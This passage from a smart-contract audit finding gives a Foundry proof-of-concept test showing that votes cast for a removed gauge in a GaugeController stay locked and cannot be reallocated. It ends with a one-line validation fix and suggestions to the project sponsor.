Proof of concept\n\nWe provide the following POC to use on `GaugeController` tests.\n\n```solidity\nfunction testPOC() public {\n    // prepare\n    uint256 v = 10 ether;\n    vm.deal(gov, v);\n    vm.startPrank(gov);\n    ve.createLock{value: v}(v);\n\n    // add gauges\n    gc.add_gauge(gauge1);\n    gc.change_gauge_weight(gauge1, 100);\n    gc.add_gauge(gauge2);\n    gc.change_gauge_weight(gauge2, 100);\n\n    // all-in on gauge1\n    gc.vote_for_gauge_weights(gauge1, 10000);\n\n    // governance removes gauge1\n    gc.remove_gauge(gauge1);\n\n    // cannot vote for gauge2\n    vm.expectRevert(\"Used too much power\");\n    gc.vote_for_gauge_weights(gauge2, 10000);\n\n    // cannot remove vote for gauge1\n    vm.expectRevert(\"Invalid gauge address\"); // @audit remove when mitigate\n    gc.vote_for_gauge_weights(gauge1, 0);\n\n    // cannot vote for gauge2 (to demonstrate again that voting power is not removed)\n    vm.expectRevert(\"Used too much power\");  // @audit remove when mitigate\n    gc.vote_for_gauge_weights(gauge2, 10000);\n}\n```\n\n## Tools used\n\nForge, manual review\n\n## Recommended mitigation steps\n\nThe simplest way to mitigate this is to **allow zero-weight votings on expired pools** simply to remove the vote. Modify line 213 as follow:\n\n```solidity\nrequire(_user_weight == 0 || isValidGauge[_gauge_addr], \"Can only vote 0 on non-gauges\");\n```\n\nhttps://github.com/code-423n4/2023-08-verwa/blob/main/src/GaugeController.sol#L213\n\nThe given POC can then be the test case to verify successful mitigation.\n\nAs a QA-based recommendation, the sponsor can also provide an external function to remove votes, and/or provide a function to vote for various pools in the same tx. This will allow users to channel their votes directly from removed pools to ongoing pools.\n\n\n## Assessed type\n\nInvalid Validation",
